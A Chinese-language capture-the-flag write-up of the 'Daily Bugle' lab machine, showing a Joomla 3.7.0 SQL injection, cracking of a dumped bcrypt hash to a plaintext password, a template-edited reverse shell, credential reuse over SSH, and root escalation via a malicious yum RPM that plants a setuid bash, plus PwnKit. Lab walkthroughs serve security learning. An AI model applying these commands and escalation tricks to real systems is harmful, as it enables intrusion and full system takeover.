# Daily Bugle

通过SQLi破坏Joomla CMS帐户，练习破解哈希并通过利用yum提升您的权限

---

循例，nmap 扫

    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql

在web兜兜转转一番后，能力有限，找不到比较有用的信息

只好通过借助metasploit

<pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>scanner/http/joomla_version</b></font>) &gt; run

<font color="#277FFF"><b>[*]</b></font> Server: Apache/2.4.6 (CentOS) PHP/5.6.40
<font color="#47D4B9"><b>[+]</b></font> Joomla version: 3.7.0
</pre>

得知joomla的版本好是3.7.0

CVE-2017-8917

了解了一下这个exp，其实就是存在报错注入并进一步的利用

    Jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

john爆破

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">echo</font> <font color="#FEA44C">&apos;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&apos;</font> <font color="#277FFF"><b>&gt;</b></font> <u style="text-decoration-style:single">./hash</u> 
                                                                                                   
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">john</font> <font color="#9755B3">--wordlist=/usr/share/wordlists/rockyou.txt</font> <u style="text-decoration-style:single">./hash</u></pre>

爆了近十分钟，爆出来了

    spiderman123

访问/administrator并登录

找了一会，这里可以修改页面php内容，我们将其修改成reverse shell

    /administrator/index.php?option=com_templates&view=template 

成功getshell

<pre>Ncat: Connection from 10.10.232.38.
Ncat: Connection from 10.10.232.38:55966.
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
</pre>

升级shell，目标主机没有python3，所以用python2

    python -c "import pty;pty.spawn('/bin/bash')"

cat ./configuration.php

这个文件包含了数据库的密码等，这个密码也是jjameson的用户密码

我们可以直接ssh登录

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">ssh</font> jjameson@10.10.232.38      </pre>

sudo -l 发现可以使用yum

我们翻看垃圾桶，然后构造

    gem install fpm
    apt install rpm

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> TF=<font color="#9755B3">$</font><font color="#277FFF"><b>(</b></font><font color="#5EBDAB">mktemp</font> <font color="#9755B3">-d</font><font color="#277FFF"><b>)</b></font>                                                                                                    
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">echo</font> <font color="#FEA44C">&apos;cp /bin/bash /tmp/cmd;chmod +s /tmp/cmd&apos;</font> <font color="#277FFF"><b>&gt;</b></font> $TF/x.sh</pre>
                                                                        
<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">fpm</font> <font color="#9755B3">-n</font> x <font color="#9755B3">-s</font> dir <font color="#9755B3">-t</font> rpm <font color="#9755B3">-a</font> all <font color="#9755B3">--before-install</font> $TF/x.sh $TF
Created package {:path=&gt;&quot;x-1.0-1.noarch.rpm&quot;}</pre>

将文件上传到目标：

    scp ./x-1.0-1.noarch.rpm jjameson@10.10.232.38:/home/jjameson

目标上安装：

    [jjameson@dailybugle ~]$ sudo yum localinstall -y x-1.0-1.noarch.rpm 


<pre>jjameson@dailybugle ~]$ /tmp/cmd -p
cmd-4.2# whoami
root
</pre>

成功getroot

提权方法二：

通杀的cve

pwnkit CVE-2021-4034，pkexec利用

<pre>[jjameson@dailybugle ~]$ ./PwnKit 
[root@dailybugle jjameson]# whoami
root
</pre>
